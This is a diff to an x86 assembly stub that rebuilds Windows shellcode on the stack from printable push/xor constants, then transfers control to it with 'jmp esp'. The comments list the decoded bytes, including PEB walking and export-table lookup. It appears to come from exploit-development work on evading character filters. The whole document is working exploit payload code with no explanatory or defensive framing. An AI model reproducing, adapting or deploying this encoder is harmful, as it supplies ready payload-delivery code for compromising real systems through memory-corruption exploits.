@@ -3,7 +3,6 @@ section .text
 global _start
 _start:
     pushad
-    pushfd
 register:
     push 0x21
     pop eax
@@ -14,10 +13,10 @@ register:
     push esp
     pop ecx
 encode:
-; push 0x90eb585a
-    push 0x24412870
+; push 0x9090585a
+    push 0x473f6639
     pop eax
-    xor eax, 0x4b55702a
+    xor eax, 0x28503e63
     push eax
     push esp
     pop edx
@@ -26,30 +25,28 @@ encode:
     xor [edx], bh
     inc edx
     xor [edx], bh
-; push 0x5ac3619d
-    push 0x3845505d
+; push 0x585ac361
+    push 0x6e605b40
     pop eax
-    xor eax, 0x6279313f
+    xor eax, 0x363a6721
     push eax
     push esp
     pop edx
-    xor [edx], bh
-    inc edx
     inc edx
     xor [edx], bh
 ; push 0xe18b9d61
     push ebx
     pop eax
-    xor eax, 0x394f5c2f
-    xor eax, 0x273b3e4e
+    xor eax, 0x5e345327
+    xor eax, 0x40403146
     push eax
     push esp
     pop edx
     xor [edx], bh
 ; push 0xd2ff500a
-    push 0x4c703544
+    push 0x716c7e65
     pop eax
-    xor eax, 0x6170654e
+    xor eax, 0x5c6c2e6f
     push eax
     push esp
     pop edx
@@ -59,9 +56,9 @@ encode:
     inc edx
     xor [edx], bh
 ; push 0x6ae08921
-    push 0x424e2b54
+    push 0x4e2d376c
     pop eax
-    xor eax, 0x28515d75
+    xor eax, 0x2432414d
     push eax
     push esp
     pop edx
@@ -70,15 +67,15 @@ encode:
     inc edx
     xor [edx], bh
 ; push 0x21212124
-    push 0x487e4c62
+    push 0x577e426e
     pop eax
-    xor eax, 0x695f6d46
+    xor eax, 0x765f634a
     push eax
 ; push 0x2c81848d
     push ebx
     pop eax
-    xor eax, 0x50384537
-    xor eax, 0x7c463e45
+    xor eax, 0x5c245851
+    xor eax, 0x705a2323
     push eax
     push esp
     pop edx
@@ -87,9 +84,9 @@ encode:
     inc edx
     xor [edx], bh
 ; push 0x82846821
-    push 0x4d474160
+    push 0x385a2568
     pop eax
-    xor eax, 0x303c2941
+    xor eax, 0x45214d49
     push eax
     push esp
     pop edx
@@ -99,14 +96,14 @@ encode:
     inc edx
     xor [edx], bh
 ; push 0x21212124
-    push 0x59746850
+    push 0x72467241
     pop eax
-    xor eax, 0x78554974
+    xor eax, 0x53675365
     push eax
 ; push 0x2c812121
-    push 0x4c584a69
+    push 0x71505c40
     pop eax
-    xor eax, 0x60266b48
+    xor eax, 0x5d2e7d61
     push eax
     push esp
     pop edx
@@ -114,17 +111,17 @@ encode:
     inc edx
     xor [edx], bh
 ; push 0x212168da
-    push 0x4965284d
+    push 0x4c423778
     pop eax
-    xor eax, 0x68444068
+    xor eax, 0x6d635f5d
     push eax
     push esp
     pop edx
     xor [edx], bh
 ; push 0x0188148b
-    push 0x2b352b23
+    push 0x76346240
     pop eax
-    xor eax, 0x2a423f57
+    xor eax, 0x77437634
     push eax
     push esp
     pop edx
@@ -133,27 +130,27 @@ encode:
     inc edx
     xor [edx], bh
 ; push 0x4a0c8b66
-    push 0x3d464c29
+    push 0x2f325845
     pop eax
-    xor eax, 0x774a384f
+    xor eax, 0x653e2c23
     push eax
     push esp
     pop edx
     inc edx
     xor [edx], bh
 ; push 0x585ae075
-    push 0x21605a50
+    push 0x382e6941
     pop eax
-    xor eax, 0x793a4525
+    xor eax, 0x60747634
     push eax
     push esp
     pop edx
     inc edx
     xor [edx], bh
 ; push 0x3c3e6889
-    push 0x77433041
+    push 0x4d6b275f
     pop eax
-    xor eax, 0x4b7d5837
+    xor eax, 0x71554f29
     push eax
     push esp
     pop edx
@@ -161,13 +158,13 @@ encode:
 ; push 0xfa81f4eb
     push ebx
     pop eax
-    xor eax, 0x6d544669
-    xor eax, 0x682a4d7d
+    xor eax, 0x3a282859
+    xor eax, 0x3f56234d
     push eax
 ; push 0xc20111ca
-    push 0x773a2a40
+    push 0x7a747961
     pop eax
-    xor eax, 0x4a3b3b75
+    xor eax, 0x47756854
     push eax
     push esp
     pop edx
@@ -177,9 +174,9 @@ encode:
     inc edx
     xor [edx], bh
 ; push 0xc10774c0
-    push 0x71224752
+    push 0x5d655a4a
     pop eax
-    xor eax, 0x4f25336d
+    xor eax, 0x63622e75
     push eax
     push esp
     pop edx
@@ -191,16 +188,16 @@ encode:
 ; push 0x84acd231
     push ebx
     pop eax
-    xor eax, 0x3f247b6f
-    xor eax, 0x4477565e
+    xor eax, 0x4560695f
+    xor eax, 0x3e33446e
     push eax
     push esp
     pop edx
     xor [edx], bh
 ; push 0xc031de01
-    push 0x596a6a23
+    push 0x6e626928
     pop eax
-    xor eax, 0x665b4b22
+    xor eax, 0x51534829
     push eax
     push esp
     pop edx
@@ -210,9 +207,9 @@ encode:
     inc edx
     xor [edx], bh
 ; push 0x8f348b49
-    push 0x38462b2e
+    push 0x3c6a2b66
     pop eax
-    xor eax, 0x48725f67
+    xor eax, 0x4c5e5f2f
     push eax
     push esp
     pop edx
@@ -222,9 +219,9 @@ encode:
     inc edx
     xor [edx], bh
 ; push 0x4be352da
-    push 0x626f6d6b
+    push 0x78413d5e
     pop eax
-    xor eax, 0x29733f4e
+    xor eax, 0x335d6f7b
     push eax
     push esp
     pop edx
@@ -233,17 +230,17 @@ encode:
     inc edx
     xor [edx], bh
 ; push 0x0124528b
-    push 0x60646248
+    push 0x26692f3a
     pop eax
-    xor eax, 0x6140303c
+    xor eax, 0x274d7d4e
     push eax
     push esp
     pop edx
     xor [edx], bh
 ; push 0xdf01207a
-    push 0x594c7b4a
+    push 0x5b4b7031
     pop eax
-    xor eax, 0x794d5b30
+    xor eax, 0x7b4a504b
     push eax
     push esp
     pop edx
@@ -252,9 +249,9 @@ encode:
     inc edx
     xor [edx], bh
 ; push 0x8b50d801
-    push 0x3b296946
+    push 0x21395f6c
     pop eax
-    xor eax, 0x4f794e47
+    xor eax, 0x5569786d
     push eax
     push esp
     pop edx
@@ -264,18 +261,18 @@ encode:
     inc edx
     xor [edx], bh
 ; push 0x1c428b14
-    push 0x67294c7d
+    push 0x4d7c2c2b
     pop eax
-    xor eax, 0x7b6b3869
+    xor eax, 0x513e583f
     push eax
     push esp
     pop edx
     inc edx
     xor [edx], bh
 ; push 0x4a8bda01
-    push 0x7c4d5472
+    push 0x2f2c5040
     pop eax
-    xor eax, 0x36397173
+    xor eax, 0x65587541
     push eax
     push esp
     pop edx
@@ -284,26 +281,26 @@ encode:
     inc edx
     xor [edx], bh
 ; push 0x781a548b
-    push 0x465a3a25
+    push 0x516a3148
     pop eax
-    xor eax, 0x3e406e51
+    xor eax, 0x2970653c
     push eax
     push esp
     pop edx
     xor [edx], bh
 ; push 0x3c538b10
-    push 0x52612279
+    push 0x76352538
     pop eax
-    xor eax, 0x6e325669
+    xor eax, 0x4a665128
     push eax
     push esp
     pop edx
     inc edx
     xor [edx], bh
 ; push 0x5b8b1b8b
-    push 0x6f52665a
+    push 0x2d395c47
     pop eax
-    xor eax, 0x34267d2e
+    xor eax, 0x764d4733
     push eax
     push esp
     pop edx
@@ -312,9 +309,9 @@ encode:
     inc edx
     xor [edx], bh
 ; push 0x1b8b145b
-    push 0x2d5a577d
+    push 0x283c7268
     pop eax
-    xor eax, 0x362e4326
+    xor eax, 0x33486633
     push eax
     push esp
     pop edx
@@ -322,9 +319,9 @@ encode:
     inc edx
     xor [edx], bh
 ; push 0x8b0c5b8b
-    push 0x3d712c2a
+    push 0x5d7c333b
     pop eax
-    xor eax, 0x497d775e
+    xor eax, 0x2970684f
     push eax
     push esp
     pop edx
@@ -334,18 +331,18 @@ encode:
     inc edx
     xor [edx], bh
 ; push 0x305b8b64
-    push 0x47622955
+    push 0x5662323d
     pop eax
-    xor eax, 0x77395d31
+    xor eax, 0x66394659
     push eax
     push esp
     pop edx
     inc edx
     xor [edx], bh
 ; push 0xdb319c60
-    push 0x5c5f3051
+    push 0x5642384f
     pop eax
-    xor eax, 0x786e5331
+    xor eax, 0x72735b2f
     push eax
     push esp
     pop edx
@@ -355,4 +352,5 @@ encode:
     inc edx
     xor [edx], bh
 ; jmp to shellcode
+to_shellcode:
     jmp esp
